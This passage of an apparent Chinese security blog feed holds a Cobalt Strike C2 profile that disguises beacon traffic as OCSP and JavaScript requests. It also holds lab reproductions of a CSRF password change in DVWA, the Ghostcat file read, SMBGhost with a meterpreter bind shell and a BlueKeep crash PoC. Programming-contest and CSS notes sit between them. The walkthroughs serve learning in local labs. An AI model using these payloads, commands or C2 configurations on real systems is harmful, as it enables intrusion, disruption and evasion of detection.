<h2 id="C2profile"><a href="#C2profile" class="headerlink" title="C2profile"></a>C2profile</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sample_name &quot;t&quot;;</span><br><span class="line">set sleeptime &quot;3000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident&#x2F;5.0)&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nodejs&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;octet-stream&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>保存，然后带着这个文件启动teamserver，<br>./teamserver IP password xxx.profile</p>
<h2 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a>创建监听器</h2><p>如图</p>
<p><img src="image-20210728145217125.png" alt="image-20210728145217125"></p>
<p>创建的时候有几点要注意</p>
<ol>
<li>HTTP Hosts填写的时候，掐头去尾，把http:// 和后面的 :80删掉，</li>
<li>由于腾讯云只给了80和443的所以创建的监听器端口也只能是80或443，一一对应</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>CCF 202006-1 线性分类器 python</title>
    <url>/2020/08/14/CCF%20202006-1%20%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB%E5%99%A8%20python-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13502978.html">源地址：https://www.cnblogs.com/This-is-Y/p/13502978.html<i class="fas fa-external-link-alt"></i></a></p>
<p>题目：</p>
<p>　　线性分类器（line）<br>　　【题目描述】<br>　　考虑一个简单的二分类问题——将二维平面上的点分为A和B两类。<br>　　训练数据包含n个点，其中第i个点（1≤i≤n）可以表示为一个三元组（x,y,type），即该点的横坐标、纵坐标和类别。<br>　　在二维平面上，任意一条直线可以表示为 θ₀+θ₁x+θ₂y=0的形式，即由θ₀，θ₁，θ₂三个参数确定该直线，且满足θ₀，θ₁不同时为0。<br>　　基于这n个已知类别的点，我们想要在平面上找到一条直线作为一个线性分类器。具体来说，这条线要把训练数据中的A、B两类点完美分隔开来，即一侧只有A类点、另一侧只有B类点。这样，对于任意一个的未知类别的点，我们就可以根据它是位于直线的哪一侧来预测它的类别了。<br>　　在本题中我们仅需要处理m个如下查询：给定一条直线，判断它是否能将训练数据中的A、B两类点完美分开。<br>【输入格式】<br>　　从标准输入读入数据。输入共n+m+1行。<br>　　第一行包含用空格分隔的两个正整数n和m，分别表示点和查询的个数。<br>　　第二行到第n+1行依次输入n个点的信息。第i+1行（1≤i≤n）包含用空格分隔的三项x,y和type，分别表示第i个点的横、纵坐标和类别，其中坐标为整数、类别为一个大写英文字母A或B。<br>　　第n+2行到第n+m+1行依次输入m个查询。第j+n+1行（1≤j≤m）包含用空格分隔的三个整数θ₀,θ₁和θ₂，表示第j个查询中给定直线的三个参数。</p>
<p>【输出格式】<br>　　输出到标准输出。<br>　　输出共m行，每行输出一个字符串。<br>　　第j行（1≤j≤m）输出的字符串对应第个查询的结果：如果给定直线可以完美分隔A、B两类点，则输出Yes；否则输出No。<br>【样例1输入】</p>
<p>9 3<br>1 1 A<br>1 0 A<br>1 -1 A<br>2 2 B<br>2 3 B<br>0 1 A<br>3 1 B<br>1 3 B<br>2 0 A<br>0 2 -3<br>-3 0 2<br>-3 1 1</p>
<p>【样例1输出】</p>
<p>No</p>
<p>No</p>
<p>Yes</p>
<p> </p>
<p>代码，用的python，从别人那里扒过来的。已获得同意   </p>
<p>再补一个我自己写的</p>
<p> </p>
<p>满分</p>
<img src="1503868-20200814163333221-1435192584.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>CCF_2020_09 python</title>
    <url>/2020/09/16/CCF_2020_09%20python-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13681884.html">源地址：https://www.cnblogs.com/This-is-Y/p/13681884.html<i class="fas fa-external-link-alt"></i></a></p>
<p>第一题：</p>
<h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>2020 年 6 月 8 日，国务院联防联控机制发布《关于加快推进新冠病毒核酸检测的实施意见》，提出对“密切接触者”等八类重点人群“应检尽检”，其他人群“愿检尽检”。</p>
<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>某市设有n个核酸检测点，编号从1到n，其中i号检测点的位置可以表示为一个平面整数坐标（xi，yi）。为方便预约核酸检测，请根据市民所在位置(X，Y)，查询距其最近的三个检测点。 多个检测点距离相同时，编号较小的视为更近。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>从标准输入读入数据。</p>
<p>输入共n+1行。</p>
<p>第一行包含用空格分隔的三个整数n、X和Y，表示检测点总数和市民所在位置。</p>
<p>第二行到第n+1行依次输入n个检测点的坐标。第i+1行（1 &lt;= i &lt;= n）包含用空格分隔的两个整数xi和yi表示i号检测点所在位置。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出到标准输出。</p>
<p>输出共三行，按距离从近到远，依次输出距离该市民最近的三个检测点编号。</p>
<h2 id="样例1输入"><a href="#样例1输入" class="headerlink" title="样例1输入"></a>样例1输入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3 2 2</span><br><span class="line">2 2</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br></pre></td></tr></table></figure>

<h2 id="样例1输出"><a href="#样例1输出" class="headerlink" title="样例1输出"></a>样例1输出</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>

<h2 id="样例2输入"><a href="#样例2输入" class="headerlink" title="样例2输入"></a>样例2输入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5 0 1</span><br><span class="line">-1 0</span><br><span class="line">0 0</span><br><span class="line">1 0</span><br><span class="line">0 2</span><br><span class="line">-1 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="样例2输出"><a href="#样例2输出" class="headerlink" title="样例2输出"></a>样例2输出</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">4</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<h2 id="样例2解释"><a href="#样例2解释" class="headerlink" title="样例2解释"></a>样例2解释</h2><td rowspan="1">检测点编号</td><td rowspan="1">1</td><td rowspan="1">2</td><td rowspan="1">3</td><td rowspan="1">4</td><td rowspan="1">5</td>
<td rowspan="1">距离</td><td rowspan="1">2–√</td><td rowspan="1">1</td><td rowspan="1">2–√</td><td rowspan="1">1</td><td rowspan="1">2–√</td>

<h2 id="子任务"><a href="#子任务" class="headerlink" title="子任务"></a>子任务</h2><p>全部的测试点满足，3&lt;= n &lt;= 200,所有坐标均为整数且绝对值不超过1000.</p>
<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>市民到第i号检测点的距离Di,可由如下公式算出：</p>
<img src="1503868-20200913203733489-1868111269.png" alt loading="lazy">

<p> </p>
<p> 代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5 2 6 20 40 100 80</span><br><span class="line">100 80 100 80 100 80 100 80 100 80 100 80</span><br><span class="line">60 50 60 46 60 42 60 38 60 34 60 30</span><br><span class="line">10 60 14 62 18 66 22 74 26 86 30 100</span><br><span class="line">90 31 94 35 98 39 102 43 106 47 110 51</span><br><span class="line">0 20 4 20 8 20 12 20 16 20 20 20</span><br></pre></td></tr></table></figure>

<h2 id="样例2输入-1"><a href="#样例2输入-1" class="headerlink" title="样例2输入"></a>样例2输入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 3 8 0 0 10 10</span><br><span class="line">-1 -1 0 0 0 0 -1 -1 0 0 -1 -1 0 0 0 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>CSRF 简单入门以及用dvwa构造的简单实例</title>
    <url>/2020/03/10/CSRF%20%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8%E4%BB%A5%E5%8F%8A%E7%94%A8dvwa%E6%9E%84%E9%80%A0%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E4%BE%8B-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12457322.html">源地址：https://www.cnblogs.com/This-is-Y/p/12457322.html<i class="fas fa-external-link-alt"></i></a></p>
<p>SRF(跨站请求伪造)</p>
<p>攻击者使用目标用户的身份，以目标用户的身份完成攻击者想要完全的操作。也可以理解为在目标用户不知情的情况下完成我们想要他完成的工作。</p>
<p>在目标用户看来，他只完成了他本人想要完成的。而在网站看来，这份工作是已经登陆的目标用户想要网站完成的。而CSRF攻击就像是做了一个中间人，对两端的目标用户和网站进行欺骗。</p>
<p>CSRF的两个重点：</p>
<p>1）<strong>目标用户已经登陆了网站，能够执行网站的功能</strong></p>
<p>2）<strong>目标用户访问了攻击者构造的URL</strong></p>
<p> </p>
<p>在BP中有构造CSRF Poc的功能，这里使用dvwa和bp来模拟一次CSRF</p>
<p>先把安全程度调低</p>
<img src="1503868-20200310171809249-88430808.png" alt width="592" height="330">

<p> 修改密码为123456。</p>
<p>这里修改123456的作用是可以理解为构造一个行为。让目标用户在不知情的情况下，通过点击一个简单的按钮，完成这个修改密码的行为。</p>
<p>点击change。抓到这个包，发送到repeat。构建CSRF Poc</p>
<img src="1503868-20200310172115797-442958379.png" alt width="829" height="627">

<p> 把这里给的HTML代码保存下来，这里我们将它构造成一个html文件</p>
<img src="1503868-20200310172945814-2015757352.png" alt>

<p>这边在浏览器打开构造的文件，是一个request按钮，只用用户点击，就会完成修改密码的动作</p>
<img src="1503868-20200310173422860-1549979433.png" alt width="888" height="493">

<p> </p>
<p>这边进入到dvwa数据库</p>
<img src="1503868-20200310174202678-902204027.png" alt>

<p> 有5个用户，用hack来登陆，来当小白鼠。账户1337，密码用cmd5破解，charley</p>
<img src="1503868-20200310174449340-1686075278.png" alt width="636" height="221">

<p> 登陆。点击刚才构造的文件的按钮。</p>
<p>然后回到dvwa主界面，刷新一下，发现回到了登录窗口。</p>
<img src="1503868-20200310174844136-268339516.png" alt>

<p>这时候用原来的charley密码是登不上去的，密码在点击时已经变成了构造文件时设置的123456</p>
<p>回到数据库中。可以发现密码的hash值已经变了。再cmd5解密，确认一下</p>
<img src="1503868-20200310175012687-654871658.png" alt width="1045" height="439">

<p> <img src="1503868-20200310175104669-1409171740.png" alt></p>
<p> 现在已经可以确认，CSRF攻击成功，账户为1337的用户hack在登陆后不知情的情况下，被修改了密码</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>CSS学习笔记_1</title>
    <url>/2019/12/16/CSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12048236.html">源地址：https://www.cnblogs.com/This-is-Y/p/12048236.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>1.调用</strong></p>
<p>　　　<strong>内部样式表：</strong></p>
<p>　　　css可以直接在html代码里面使用&lt;/style&gt;&lt;/style&gt;节点。允许html代码中有两个style节点，但是起作用的是靠后的节点</p>
<p> </p>
<p> </p>
<p>　　　<img src="1503868-20191216111741520-263907810.png" alt width="727" height="457"></p>
<p> </p>
<p> </p>
<p> 　　如图的代码，起作用的是最后一个</p>
<p>　　&lt;style&gt;<br>　　h3{font-size:20pt;color:black;}<br>　　&lt;/style&gt;</p>
<p>　　<strong>外部样式表：</strong></p>
<p>　　在&lt;head&gt;&lt;/head&gt;节点中使用&lt;link rel=’stylesheet’  type=’text/css’   href=’css文件位置’ /&gt; 代码来调用css代码</p>
<p>　　<strong>多重样式表：</strong></p>
<p>·　　这个放在后面再说</p>
<p><strong>2.注释</strong></p>
<p>**　　**html：&lt;!– 注释内容 –&gt; 进行注释。</p>
<p>　　css：·/* 注释内柔 */ 进行注释。</p>
<p>　　这里再说一下其他语言的注释方法(参考：<a class="link" href="https://blog.csdn.net/tim_st/article/details/78185807">https://blog.csdn.net/tim_st/article/details/78185807<i class="fas fa-external-link-alt"></i></a>)</p>
<p>　　C/C++/C#<br>　　行注释：//这里是注释<br>　　块注释：/<em>这里是注释</em>/</p>
<p> </p>
<p>　　Java<br>　　行注释：//这里是注释<br>　　块注释：/<em>这里是注释</em>/</p>
<p> </p>
<p>　　JavaScript<br>　　行注释：//这里是注释<br>　　块注释：/<em>这里是注释</em>/</p>
<p> </p>
<p>　　XML<br>　　块注释：&lt;!–这里是注释–&gt;</p>
<p> </p>
<p>　　Python<br>　　行注释：#这里是注释<br>　　块注释：’’’这里是注释’’’</p>
<p>　　PHP</p>
<p>　　行注释：**// **这里是注释</p>
<p>**　　*<em>块注释：/</em> 这里是注释内容 */</p>
<p> </p>
<p>　　SQL Server/Oracle PLSQL<br>　　行注释：–这里是注释<br>　　块注释：/<em>这里是注释</em>/</p>
<p> </p>
<p>　　MySQL<br>　　行注释：–这里是注释<br>　　行注释：#这里是注释<br>　　块注释：/<em>这里是注释</em>/</p>
<p> </p>
<p>　　VB</p>
<p> </p>
<p>　　行注释：’这里是注释</p>
<p> </p>
<p>　　汇编语言</p>
<p> </p>
<p>　　行注释：;这里是注释</p>
<p> </p>
<p>　　perl</p>
<p> </p>
<p>　　行注释：# 这是一个单行注释</p>
<p> </p>
<p>　　块注释：</p>
<p> </p>
<p>　　=pod</p>
<p> </p>
<p> 　　这里是注释<br>　　=cut</p>
<p><strong>3.背景</strong></p>
<ul>
<li>background-color   #颜色</li>
<li>background-image　 #图片</li>
<li>background-repeat     #平铺方式</li>
<li>background-attachment        #背景图是否固定</li>
<li>background-position      #位置</li>
</ul>
<p>　　background-image:url(图片名)。如background-image:url(‘img.jpg’)（不是位置，图片应放在代码同目录下）</p>
<p>　　background-repeat：repeat-x(水平平铺)，repeat-y(垂直平铺)，no-repeat(不平铺) </p>
<p>**<em><em>　　**</em></em>background-attachment：</p>
<p>　　<img src="1503868-20191216151036055-1946181375.png" alt width="820" height="215"></p>
<p>　　background-position：</p>
<p>　　<img src="1503868-20191216150936068-1208465365.png" alt width="815" height="426"></p>
<p> </p>
<p> </p>
<p> </p>
<p> 　　然后可以采用简写属性，如body {background:#ffffff url(‘img_tree.png’) no-repeat right top;}</p>
<p>　　简写属性对应关系为：</p>
<ul>
<li>background-color</li>
<li>background-image</li>
<li>background-repeat</li>
<li>background-attachment</li>
<li>background-position</li>
</ul>
<p>** 4.选择器**</p>
<p>　　选择器分为id选择器和class选择器，作用效果相同，可以通过特定的id或class对一组元素进行处理。</p>
<p>　　id选择器使用#id值{}。如&lt;p id=”part1”&gt;Hello World!&lt;/p&gt; id选择器：#part1{ text-align:center; color:red;}</p>
<p>　　class选择器使用p.class值{}(只有p节点内有class属性的时候，可以写为.class值{})。如&lt;p class=”part2”&gt;Hello World!&lt;/p&gt; id选择器：.class2{ text-align:center; color:red;}</p>
<p>　　值得注意的是：ID属性不要以数字开头，数字开头的ID在 Mozilla/Firefox 浏览器中不起作用。</p>
<p>　　　　　　　　　类名的第一个字符不能使用数字！它无法在 Mozilla 或 Firefox 中起作用。</p>
<p>　　　　　　　　（火狐事真多　　　　==）</p>
<p><strong>5.文本属性</strong></p>
<p>　　color：颜色</p>
<p>　　text-align：对齐方式</p>
<p>　　text-decoration：文本修饰(主要用于消除下划线)</p>
<p>　　text-transform：文本转化(大小写转化或首字母大小写转化)</p>
<p>　　text-indent：文本缩进</p>
<p>　　letter-spacing：字符之间的距离</p>
<p>　　line-height：行与行之间的距离</p>
<p>　　direction：文本方向(从右到左)</p>
<p>　　word-spacing：单词之间的距离(前面那个是字符)(中文无效)</p>
<p>　　white-space:元素环绕</p>
<p>　　vertical-align：图片对齐方向</p>
<p>　　text-shadow：添加文本阴影</p>
<p>　　值得注意的事： 对于W3C标准的CSS：如果你定义了颜色属性，你还必须定义背景色属性。</p>
<p>　　font ：</p>
<p>　　　　font-family：设置字体系列</p>
<p>　　　　font-style：设置字体样式</p>
<p>　　　　font-size：设置字体大小(为了避免Internet Explorer 中无法调整文本的问题，许多开发者使用 em 单位代替像素。em的尺寸单位由W3C建议。1em和当前字体大小相等。在浏览器中默认的文字大小是16px。因此，1em的默认大小是16px。可以通过下面这个公式将像素转换为em：px/16=em**)**</p>
<p>　　　　font-weight：设置字体粗细</p>
<p>　　　　font-variant：设置小型大写字体</p>
<p>6.链接</p>
<ul>
<li>a:link - 正常，未访问过的链接</li>
<li>a:visited - 用户已访问过的链接</li>
<li>a:hover - 当用户鼠标放在链接上时</li>
<li>a:active - 链接被点击的那一刻</li>
</ul>
<p>　　如 a:link {color:#000000;} </p>
<p>　 　   a:visited {color:#00FF00;} </p>
<p>　　    a:hover {color:#FF00FF;}  </p>
<p>　　    a:active {color:#0000FF;} <br></p>
<p>css内容还有很多，这里先写一部分</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>CVE 2020 1938</title>
    <url>/2020/06/26/CVE%202020%201938-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13194048.html">源地址：https://www.cnblogs.com/This-is-Y/p/13194048.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>漏洞简介</strong></p>
<p><br>　　漏洞编号：cve-2020-1938</p>
<p>　　cve-2020-1938是一个出现在Apache-Tomcat-Aip的文件包含漏洞，攻击者可以利用该漏洞读取包含Tomcat上所有的webapp目录下的任意文件写入：webapp配置文件或源代码。<br><br>　　由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p>
<p>　　该漏洞只影响Windows平台，<strong>要求启用了CGIServlet和enableCmdLineArguments参数。</strong></p>
<p><br><strong>漏洞影响范围</strong><br><br>　　Apache Tomcat 6<br><br>　　Apache Tomcat 7 &lt; 7.0.100<br><br>　　Apache Tomcat 8 &lt; 8.5.51<br><br>　　Apache Tomcat 9 &lt; 9.0.31</p>
<p> </p>
<p><strong>环境搭建</strong></p>
<p>**　　**从<a class="link" href="https://archive.apache.org/dist/tomcat/%E4%B8%8B%E8%BD%BD%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%B8%8B%E7%9A%848.5.30">https://archive.apache.org/dist/tomcat/下载历史版本，这里我下的8.5.30<i class="fas fa-external-link-alt"></i></a></p>
<p>　　<a class="link" href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/bin/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/bin/<i class="fas fa-external-link-alt"></i></a></p>
<p>　　<img src="1503868-20200625105451210-1577079758.png" alt loading="lazy"></p>
<p> </p>
<p> 下载，解压，进入bin目录执行startup.bat文件，成功了差不多就是这个样子</p>
<img src="1503868-20200625153216488-1832120573.png" width="900" loading="lazy">

<p> </p>
<p> </p>
<p> 如果出现黑框闪一下就结束了的情况。可能是JAVA和JRE没找到，照<a class="link" href="https://blog.csdn.net/qq_31424825/article/details/102960742">这篇文章<i class="fas fa-external-link-alt"></i></a>或自己上网找办法解决一下</p>
<p>运行后，浏览器访问<a class="link" href="http://localhost:8080/">http://localhost:8080/<i class="fas fa-external-link-alt"></i></a>   应该就可以看到这只扭曲到搞人心态的猫脸了</p>
<p>真是不理解为什么会用这么扭曲的脸</p>
<img src="1503868-20200625153552252-1512878631.png" width="900" loading="lazy">

<p> </p>
<p> </p>
<p>可以用nmap查看端口打开情况，可以看到8009端口打开<br></p>
<img src="1503868-20200625163202541-1435959186.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> POC链接：<a class="link" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi<i class="fas fa-external-link-alt"></i></a></p>
<p>执行：python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1 -p 8009 -f WEB-INF/web.xml（用python2执行）</p>
<img src="1503868-20200625163313982-135638821.png" width="900" loading="lazy">

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>CVE - 2020- 0796复现</title>
    <url>/2020/06/20/CVE%20-%202020-%200796%E5%A4%8D%E7%8E%B0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13166766.html">源地址：https://www.cnblogs.com/This-is-Y/p/13166766.html<i class="fas fa-external-link-alt"></i></a></p>
<p>复现过程参考：<a class="link" href="https://xz.aliyun.com/t/7440">https://xz.aliyun.com/t/7440<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://www.lstazl.com/cve-2020-0796%E5%BE%AE%E8%BD%AF-smbv3%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://www.lstazl.com/cve-2020-0796%E5%BE%AE%E8%BD%AF-smbv3%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/<i class="fas fa-external-link-alt"></i></a></p>
<p>下载，安装win10虚拟机。受影响win10版本</p>
<p>Windows 10 Version 1903 for 32-bit Systems<br><br>Windows 10 Version 1903 for x64-based Systems<br><br>Windows 10 Version 1903 for ARM64-based Systems<br><br>Windows Server, Version 1903 (Server Core installation)<br><br>Windows 10 Version 1909 for 32-bit Systems<br><br>Windows 10 Version 1909 for x64-based Systems<br><br>Windows 10 Version 1909 for ARM64-based Systems<br><br>Windows Server, Version 1909 (Server Core installation)<br><br>只影响 SMB v3.1.1，1903和1909</p>
<p> </p>
<p>关闭自动更新，关闭防火墙</p>
<p>ipconfig确认ip：<strong>192.168.229.131</strong></p>
<img src="1503868-20200619152836656-226314013.png" alt loading="lazy">

<p> </p>
<p> 下载漏洞检查工具，这里用的exe版本（<a class="link" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">奇安信<i class="fas fa-external-link-alt"></i></a>）</p>
<p>允许，检测，存在漏洞。</p>
<img src="1503868-20200619152754960-879738139.png" alt loading="lazy">

<p>在调整了一下后</p>
<p>靶机win10：192.168.87.128</p>
<p>攻击kali：192.168.87.130</p>
<p>（因为物理机没法执行，所以转战虚拟机）</p>
<br>
蓝屏/提权poc  ：[**https://github.com/dacade/CVE-POC/tree/master/CVE-2020-0796**](https://github.com/dacade/CVE-POC/tree/master/CVE-2020-0796)

<p>kali一个终端打开msf，</p>
<p>use exploit/multi/handler</p>
<p>set payload windows/x64/meterpreter/bind_tcp</p>
<p>set lport 3333（POC默认为3333端口）</p>
<p>set rhost 192.168.87.128</p>
<p>run</p>
<img src="1503868-20200620193059366-1301103579.png" alt loading="lazy">

<p> 然后在那边执行POC</p>
<p>python exploit.py 192.168.87.128</p>
<img src="1503868-20200620203838299-500642625.png" alt loading="lazy">

<p> 回到win10虚拟机，就可以看到蓝屏了。</p>
<img src="1503868-20200620175556462-1719505833.png" width="800" loading="lazy">

<p>然后隔壁老王告诉我，执行这个脚本，当目标靶机内存比较小（我这时候设置的4G）就会出现蓝屏，设置高一点（同时脸不要这么黑）</p>
<p>之后调整了一下，把win10靶机设为8G内存，就成功拿到了shell</p>
<img src="1503868-20200620203752320-455677403.png" alt loading="lazy">

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2019-0708</title>
    <url>/2020/06/21/CVE-2019-0708-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13172491.html">源地址：https://www.cnblogs.com/This-is-Y/p/13172491.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>复现过程参考：</strong></p>
<p><a href="https://blog.csdn.net/weixin_44677409/article/details/94552370"><strong>https://blog.csdn.net/weixin_44677409/article/details/94552370</strong></a></p>
<p><a href="https://www.freebuf.com/vuls/205380.html"><strong>https://www.freebuf.com/vuls/205380.html</strong></a></p>
<p> </p>
<p><strong>环境：</strong></p>
<p>靶机：win7sp1　　IP：192.168.87.130</p>
<p>攻击机：虚拟机kali　　IP：192.168.87.131</p>
<p>　　　　win10物理机 　　</p>
<p>构建好网络环境</p>
<p>确保win7，kali，win10之间可用相互ping通</p>
<p> </p>
<p>CVE - 2019-0708微软RDP远程代码执行漏洞</p>
<p><strong>受影响系统：</strong></p>
<p>     Windows 7<br><br>    Windows Server 2008 R2<br><br>    Windows Server 2008<br><br>    Windows Server 2003<br><br>    Windows XP</p>
<p>检测程序</p>
<p><a class="link" href="https://pan.baidu.com/s/1BPsPHwb5PwP7XEitmaYsTw">360_RDP漏洞扫描工具<i class="fas fa-external-link-alt"></i></a>（提取码: 59zd 解压密码：360）</p>
<p>win7需要专业版以上。</p>
<img src="1503868-20200621113953871-1422825953.png" width="900" loading="lazy">

<p> </p>
<p> </p>
<p> 打开3389端口</p>
<p>cmd下执行netstate -an或netstate -an|find “3389”查看是否打开</p>
<img src="1503868-20200621114107660-958526615.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 之后在物理机上执行360检测程序</p>
<p>C:\Users\This_is_Y\Desktop\360检测\0708detector.exe -t 192.168.87.131 -p 3389</p>
<img src="1503868-20200621114551785-651719254.png" width="900" loading="lazy">

<p> </p>
<p>像这样子就是存在该漏洞的</p>
<p> </p>
<p> 值得注意的是，如果电脑上开着火绒（其他杀毒程序不清楚），在执行程序的时候，火绒会拦截。。。。。。</p>
<p>就会出现下面的错误</p>
<img src="1503868-20200621114748851-1235653736.png" width="900" loading="lazy">

<p> </p>
<p> </p>
<p> 所以记得先关一下火绒</p>
<p>当然也可以用msf去检测</p>
<p>search 0708</p>
<p>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep 或者use 0</p>
<p>set rhosts 192.168.87.131</p>
<p>run</p>
<img src="1503868-20200621123247736-613746743.png" alt loading="lazy">

<p> </p>
<p> </p>
<p>** 蓝屏利用：**</p>
<p>先下载python3 的pip</p>
<p>apt-get install python3-pip</p>
<p>再安装 impacket<br>pip3 install impacket</p>
<p>下载POC<br>git clone <a class="link" href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708.git<i class="fas fa-external-link-alt"></i></a><br>cd CVE-2019-0708</p>
<p><img src="1503868-20200621125123058-934581207.png" alt><br>python3 crashpoc.py 192.168.87.131 64     #python3 crashpoc.py ip地址 系统类型</p>
<img src="1503868-20200621125320504-14540181.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 蓝屏了。几乎是命令执行下去瞬间蓝的。ok</p>
<img src="1503868-20200621125302966-45794403.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> <strong>反弹shell：</strong></p>
<p>进入msf</p>
<p>search bluekeep</p>
<img src="1503868-20200621130320969-1335288620.png" alt loading="lazy">

<p> </p>
<p> 选择这个</p>
